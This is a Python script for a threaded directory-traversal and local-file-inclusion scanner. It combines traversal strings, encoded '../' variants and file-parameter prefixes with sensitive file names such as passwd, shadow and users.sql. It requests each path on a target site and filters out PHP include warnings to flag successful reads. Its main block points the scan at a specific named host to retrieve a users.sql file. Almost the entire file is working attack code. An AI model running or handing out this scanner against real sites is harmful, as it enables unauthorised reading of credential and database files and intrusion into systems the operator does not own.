import sys
import requests
import time
import concurrent.futures
from itertools import repeat

# Path searched counter
a = 0

stuff = [
    "",
    "backup/",
    "services/",
    "database/",
    "db/",
    "backup-db/",
    "etc/",
    "var/",
    "var/log/",
    "var/www/files/",
]
dots = [
    "",
    "../",
    "../../",
    "../../../",
    "etc/",
   # "/..",
   # "....//",
   # "//....",
   # "%252e%252e%255c",
   # "%2e%2e%5c",
   # "..%255c",
   # "..%5c",
   # "%5c../",
   # "/%5c..",
   # "..\\",
    "%2e%2e%2f",
   #    "../../../../",
]
files = [
    "",
    "?file=",
    "get-files",
    "get-files?",
    "file:",
    "get-files?file=",
    "file:",
    "file:/",
    "file://",
]

words = [
    "",
    "services",
    "functions",
    "default",
    "backup",
    "users",
    "connect",
    "shadow",
    "security",
    "passwd",
    "group",
    "index",
    "admin",
    "login",
    "homes",
    "dashboard",
    "text",
    "delete",
    "update",
    "remove",
    "access",
    "apache",
    "apache2",
]
suffix = [
    "",
    ".sql",
    ".py",
    ".php",
    ".html",
    ".txt",
   # ".js",
   # ".log",

]

def count_searched():
    """
    Function counts searched paths
    :return: Number of searched paths
    """
    global a
    a += 1
    # if a % 200 == 0:
    #    print("searching...    (" + str(a) + " searched)")
    return a


def false_positives(end, content):
    """
    Function checks if found content includes warning messages
    :param end: End part of file path
    :param content: Content found in path
    :return: False if content doesn't include warnings
    """
    warning_message = False
    too_long = False
    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
    warning3 = "Warning: include("
    warning4 = "): failed to open stream: No such file or directory in"
    warning5 = "Warning: include(): Failed opening \'"
    # Too long content is usually an error
    if len(content) > 2000000:
        too_long = True
    if warning1 in content or warning2 in content:
        warning_message = True
    elif warning3 in content and warning4 in content and warning5 in content:
        warning_message = True
    if warning_message == False and too_long == False:
        return False
    else:
        return True


def not_normal(content, normal_content):
    """
    Function compares contents
    :param cur_content: Content found in a path
    :param norm_content: Content usually found on a website
    :return: True if contents differ
    """
    if content != normal_content:
        return True
    else:
        return False


def content_adjustment(cur_content, norm_content):
    """
    Function cuts usual website content from found content
    :param cur_content: Content found in a path
    :param norm_content: Content usually found on a website
    :return: Content without normal website content
    """
    if norm_content in cur_content:
        shortened_content = cur_content.replace(norm_content, "\nNormal website content\nSHORTENED")
        return shortened_content
    else:
        return cur_content


def try_path(target_url, path, end):
    """
    Function requests specific path and puts the content through various test to see if the exploit was successful
    :param target_url: Target URL
    :param path: Tested path
    :param end: End of path
    :return: Successful path
    """
    full_content = ""
    shortened_content = ""
    headers = ""
    successful = False
    full_path = target_url + path
    try:
        request = requests.get(full_path)
        normal_content = normal_con(target_url)
        status = request.status_code
        if status == 200:
            # False positive tests
            # Isn't normal website content
            if not_normal(request.text, normal_content):
                # Isn't error message
                if false_positives(end, request.text) == False:
                    # all tests passed
                    """
                    print("\n" + full_path)
                    print("[+] Status Code: " + str(status))
                    for item, value in request.headers.items():
                        headers += "\n" + item + value
                    print("[+] Headers:" + headers)
                    Get rid of normal website content
                    content_body = content_adjustment(request.text, normal_content)
                    print("\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                    try:
                        f = open("l.txt", "a")
                        f.write("\n----------------------------------------------------------------------------------------------")
                        f.write("\n" + full_path)
                        f.write("\n----------------------------------------------------------------------------------------------")
                        f.write("\n[+] Status Code: " + str(status) + "\n[+] Headers:" + headers +
                                "\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                        f.close()
                    except:
                        print("Issue with a file")
                    """
                    successful = True
        request.close()
    except:
        request.close()
    return successful


def scan_for_file(url, file_name):
    """
    Function generates paths for file to test all combinations from a lists
    :param url: Target URL
    :param file_name: File for which paths will be generated
    :return: List with successful paths
    """
    successful_path_list = []
    for file in files:
        for dot in dots:
            for stu in stuff:
                count_searched()
                cur_path = file + dot + stu + file_name
                cur_end = dot + stu + file_name
                result = try_path(url, cur_path, cur_end)
                if result:
                    successful_path_list.append(url + cur_path)
    return successful_path_list


def normal_con(url):
    """
    Function gets website content
    :param url: Target URL
    :return: Usual website content
    """
    content = requests.get(url)
    return content.text


def threading(url):
    """
    Function threads and starts attack on each file name (from list "word")
    :param url: Target URL
    :return: List with successful paths
    """
    # Start threading with elements from list words
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        #each file name (without suffix) is a thread
        result = executor.map(add_suffix, repeat(url), words)
    # Adjust the result (tuple with lists as elements)
    tuple_of_lists = tuple(result)
    list_of_lists = list(tuple_of_lists)
    final_list = []
    # Iterate over all elements in lists in a list
    for lis in list_of_lists:
        for item in lis:
            final_list.append(item)
    # Final list with found paths
    return final_list


def add_suffix(url, thread_file):
    """
    Function adds suffixes (form "suffix") to parameter
    :param url: Target URL
    :param thread_file: File name without suffix
    :return: List with successful paths
    """
    succesfull = []
    for suf in suffix:
        file = thread_file + suf
        i = scan_for_file(url, file)
        succesfull.extend(i)
    return succesfull


def scan(url, custom_code=False):
    """
    Function performs Directory traversal attack
    :param custom_code: Custom file (e.g. text.py)
    :param target_url: Target URL
    :return: Attack success
    """
    response = {'target_url': url}
    if custom_code is not False:
        response = {'attack_type': 'custom attack'}
        successful = scan_for_file(url, custom_code)
    else:
        response = {'attack_type': 'full scan'}
        successful = threading(url)
    response['tried'] = str(count_searched())
    if len(successful) > 0:
        response['status'] = True
        response['found'] = str(len(successful))
        response['found_path'] = successful
    else:
        response['status'] = False
    return response


def launch(target_url, attack_type, custom_code):
    """
    Function launch Directory (Path) traversal with provided parameters
    :param target_url: Target URL
    :param attack_type: Type of Path traversal
    :param custom_code: Custom file name (connect.py) (OPTIONAL)
    :return: Attack success
    """
    response = {}
    # Check if last character is '/'
    if target_url[-1] != '/':
        target_url = target_url + '/'
    try:
        r = requests.get(target_url)
        if attack_type == 'full_scan':
            response = scan(target_url)
        elif attack_type == 'custom':
            response = scan(target_url, custom_code)
        else:
            response = {'error': True, 'description': 'Invalid attack type'}
    except requests.ConnectionError:
        response = {'error': True, 'description': 'Host not responding'}
    except requests.MissingSchema:
        response = {'error': True, 'description': 'Invalid URL'}
    finally:
        return response


if __name__ == '__main__':
    url = 'http://apache1.willilazarov.cz/'
    scan(url, "users.sql")
